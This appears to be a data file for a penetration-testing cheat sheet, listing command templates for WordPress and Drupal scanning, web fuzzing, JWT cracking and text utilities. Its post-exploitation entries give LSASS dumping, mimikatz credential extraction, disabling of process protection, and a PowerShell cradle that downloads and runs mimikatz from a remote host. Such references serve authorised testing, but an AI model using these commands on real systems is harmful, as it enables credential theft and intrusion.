var data = [
    {
        "id": 1,
        "tool": "WPSCAN",
        "category": "RECON",
        "information": "Scan wordpress web site with wpscan",
        "command": "wpscan --proxy http://127.0.0.1:8080 --url [url] --disable-tls-checks -e ap,tt,cb,dbe,u1-20,m --api-token [wpscan_apitoken]"
    },
    {
        "id": 2,
        "tool": "drupwn",
        "category": "RECON",
        "information": "Scan drupal web site with drupwn",
        "command": "drupwn --users --nodes --modules --dfiles --themes enum [url]"
    },
    {
        "id": 3,
        "tool": "WEB",
        "category": "RECON",
        "information": "Extract all links from a web page",
        "command": "curl -k -s [url] | grep -o 'http://[^\"]*' | cut -d \"/\" -f 3 | sort -u"
    },
    {
        "id": 4,
        "tool": "gobuster",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with gobuster with classic extensions",
        "command": "gobuster dir -u [url] -w [wordlist] -x php,html,txt,xml,md [add other] -o [outputfile]"
    },
    {
        "id": 5,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with classic extensions",
        "command": "ffuf -u [url]/FUZZ -w [wordlist]"
    },
    {
        "id": 6,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a custom header and response size and code filter",
        "command": "ffuf -u [url]/FUZZ -w [wordlist] -H 'Cookie: [cookie]' -fs [size] -fc [code]"
    },
    {
        "id": 7,
        "tool": "ffuf",
        "category": "ATTACK/FUZZ",
        "information": "Fuzz a web site with ffuf with a post data",
        "command": "ffuf -u [url] -w [wordlist] -X POST -d '[data]'"
    },
    {
        "id": 8,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "Bruteforce a JWT token key",
        "command": "python3 jwt_tool.py -d [wordlist] [token]"
    },
    {
        "id": 9,
        "tool": "JwtTool",
        "category": "RECON",
        "information": "JWT tool perform all test on a token",
        "command": "python3 jwt_tool.py -M at -t \"[url]\" -rh \"Authorization: Bearer [JWT_Token]\" -rh \"[other_header]\" -rc \"[cookies]\""
    },
    {
        "id": 10,
        "tool": "sed",
        "category": "UTILS",
        "information": "Replace multiple space to one",
        "command": "sed -e 's/  */ /g'"
    },
    {
        "id": 11,
        "tool": "sed",
        "category": "UTILS",
        "information": "Remove the last char",
        "command": "sed 's/.$//'"
    },
    {
        "id": 12,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract md5 hash ({32})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt"
    },
    {
        "id": 13,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha1 hash ({40})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{40}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{40}' > sha1-hashes.txt"
    },
    {
        "id": 14,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha256 hash ({64})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{64}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{64}' > sha256-hashes.txt"
    },
    {
        "id": 15,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract sha512 hash ({128})",
        "command": "egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{128}([^a-fA-F0-9]|$)' [file] | egrep -o '[a-fA-F0-9]{128}' > sha512-hashes.txt"
    },
    {
        "id": 16,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid MySQL-old hash",
        "command": "grep -e \"[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}\" [file] > mysql-old-hashes.txt"
    },
    {
        "id": 17,
        "tool": "grep hash",
        "category": "UTILS",
        "information": "Extract valid blowfish hash",
        "command": "grep -e \"$2a\\$\\08\\$(.){75}\" [file] > blowfish-hashes.txt"
    },
    {
        "id": 18,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract emails from file",
        "command": "grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\\b\" [file]"
    },
    {
        "id": 19,
        "tool": "Others grep",
        "category": "UTILS",
        "information": "Extract IP from file",
        "command": "grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" file.txt"
    },
    {
        "id": 20,
        "tool": "Compile",
        "category": "CODE/COMPILE",
        "information": "Compile windows PE executable on linux",
        "command": "i686-w64-mingw32-gcc -o [output.exe] [source.c] -lws2_32"
    },
    {
        "id": 21,
        "tool": "QR code",
        "category": "UTILS",
        "information": "Decode a QR code",
        "command": "zbarimg [image]"
    },
    {
        "id": 22,
        "tool": "QR code",
        "category": "UTILS",
        "information": "Create a QR code",
        "command": "echo [content] | curl -F-=\<- qrenco.de"
    },
    {
        "id": 23,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Search and replace within a file",
        "command": "sed -i 's/[search]/[replace]/g' [file]"
    },
    {
        "id": 24,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file frome remote server to local",
        "command": "scp [user]@[remote]:[file] [local]"
    },
    {
        "id": 25,
        "tool": "linux bash",
        "category": "UTILS",
        "information": "Copy file from local to remote server",
        "command": "scp [file] [user]@[remote]:[path]"
    },
    {
        "id": 26,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - local",
        "command": "procdump.exe -accepteula -ma [pid or name] [output.dmp]"
    },
    {
        "id": 27,
        "tool": "procdump",
        "category": "POST-EXPLOITATION",
        "information": "Dump a process memory - remote",
        "command": "net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass.exe] [lsass.dmp]"
    },
    {
        "id": 28,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION",
        "information": "mimikatz one liner",
        "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\""
    },
    {
        "id": 29,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION",
        "information": "load mimikatz in memory",
        "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\""
    },
    {
        "id": 30,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION",
        "information": "mimikatz disable ppl and dump password",
        "command": "mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\""
    },

    {
        "id": 31,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION",
        "information": "mimikatz extract credentials from dump",
        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\""
    },
    {
        "id": 32,
        "tool": "mimikatz",
        "category": "POST-EXPLOITATION",
        "information": "mimikatz extract credentials from shadow copy (1)",
        "command": "mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\""
    }
]